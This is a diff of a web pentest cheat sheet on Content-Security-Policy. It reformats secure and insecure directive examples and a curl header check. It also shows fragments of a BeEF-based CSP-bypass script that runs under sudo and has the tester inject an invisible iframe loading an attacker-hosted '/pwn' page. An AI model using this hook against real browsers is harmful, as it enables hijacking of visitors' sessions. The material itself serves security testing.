@@ -2,7 +2,7 @@
 
 ## Check List
 
-* [ ] _Review the Content-Security-Policy header or meta element to identify misconfigurations._
+* [ ] Review the Content-Security-Policy header or meta element to identify misconfigurations.
 
 ## Cheat Sheet
 
@@ -16,121 +16,161 @@ curl -I $WEBSITE | grep "content-security-policy"
 
 ### CSP Parameters
 
-_default-src (Secure)_
+{% hint style="info" %}
+default-src (Secure)
+{% endhint %}
 
 ```bash
 Content-Security-Policy: default-src 'self'
 ```
 
-_default-src (Non-Secure)_
+{% hint style="info" %}
+default-src (Non-Secure)
+{% endhint %}
 
 ```bash
 Content-Security-Policy: default-src *
 ```
 
-_script-src (Secure)_
+{% hint style="info" %}
+script-src (Secure)
+{% endhint %}
 
 ```bash
 Content-Security-Policy: script-src 'self' 'nonce-random123'
 ```
 
-_script-src (Non-Secure)_
+{% hint style="info" %}
+script-src (Non-Secure)
+{% endhint %}
 
 ```bash
 Content-Security-Policy: script-src 'unsafe-inline'
 ```
 
-_style-src (Secure)_
+{% hint style="info" %}
+style-src (Secure)
+{% endhint %}
 
 ```bash
 Content-Security-Policy: style-src 'self' 'sha256-abc123'
 ```
 
-_style-src (Non-Secure)_
+{% hint style="info" %}
+style-src (Non-Secure)
+{% endhint %}
 
 ```bash
 Content-Security-Policy: style-src 'unsafe-inline'
 ```
 
-_img-src (Secure)_
+{% hint style="info" %}
+img-src (Secure)
+{% endhint %}
 
 ```bash
 Content-Security-Policy: img-src 'self' https://cdn.example.com
 ```
 
-_img-src (Non-Secure)_
+{% hint style="info" %}
+img-src (Non-Secure)
+{% endhint %}
 
 ```bash
 Content-Security-Policy: img-src *
 ```
 
-_connect-src (Secure)_
+{% hint style="info" %}
+connect-src (Secure)
+{% endhint %}
 
 ```bash
 Content-Security-Policy: connect-src 'self' https://api.example.com
 ```
 
-_connect-src (Non-Secure)_
+{% hint style="info" %}
+connect-src (Non-Secure)
+{% endhint %}
 
 ```bash
 Content-Security-Policy: connect-src *
 ```
 
-_font-src (Secure)_
+{% hint style="info" %}
+font-src (Secure)
+{% endhint %}
 
 ```bash
 Content-Security-Policy: font-src 'self' https://fonts.gstatic.com
 ```
 
-_font-src (Non-Secure)_
+{% hint style="info" %}
+font-src (Non-Secure)
+{% endhint %}
 
 ```bash
 Content-Security-Policy: font-src *
 ```
 
-_object-src (Secure)_
+{% hint style="info" %}
+object-src (Secure)
+{% endhint %}
 
 ```bash
 Content-Security-Policy: object-src 'none'
 ```
 
-_object-src (Non-Secure)_
+{% hint style="info" %}
+object-src (Non-Secure)
+{% endhint %}
 
 ```bash
 Content-Security-Policy: object-src *
 ```
 
-_frame-src (Secure)_
+{% hint style="info" %}
+frame-src (Secure)
+{% endhint %}
 
 ```bash
 Content-Security-Policy: frame-src 'self' https://trusted.example.com
 ```
 
-_frame-src (Non-Secure)_
+{% hint style="info" %}
+frame-src (Non-Secure)
+{% endhint %}
 
 ```bash
 Content-Security-Policy: frame-src *
 ```
 
-_frame-ancestors (Secure)_
+{% hint style="info" %}
+frame-ancestors (Secure)
+{% endhint %}
 
 ```bash
 Content-Security-Policy: frame-ancestors 'none'
 ```
 
-_frame-ancestors (Non-Secure)_
+{% hint style="info" %}
+frame-ancestors (Non-Secure)
+{% endhint %}
 
 ```bash
 Content-Security-Policy: frame-ancestors *
 ```
 
-_sandbox (Secure)_
+{% hint style="info" %}
+sandbox (Secure)
+{% endhint %}
 
 ```bash
 Content-Security-Policy: sandbox
 ```
 
-_sandbox (Non-Secure)_
+{% hint style="info" %}
+sandbox (Non-Secure)
+{% endhint %}
 
 ```bash
 Content-Security-Policy: sandbox allow-scripts allow-forms
@@ -140,7 +180,9 @@ Content-Security-Policy: sandbox allow-scripts allow-forms
 
 #### [BeEF ](https://beefproject.com/)& JSONP
 
-_Create Script_
+{% hint style="info" %}
+Create Script
+{% endhint %}
 
 ```bash
 sudo nano beef-csp-bypass.sh
@@ -252,7 +294,9 @@ printf "%b[*] BeEF PASS: 00980098%b\n" "$CYAN" "$RESET"
 printf "%bBeEF Panel > Commands > Misc > Create Invisible Iframe > URL: http://$WAN:8080/pwn > Execute%b\n" "$GREEN" "$RESET"
 ```
 
-_Run Script_
+{% hint style="info" %}
+Run Script
+{% endhint %}
 
 ```bash
 sudo chmod +x beef-csp-bypass.sh;sudo ./beef-csp-bypass.sh
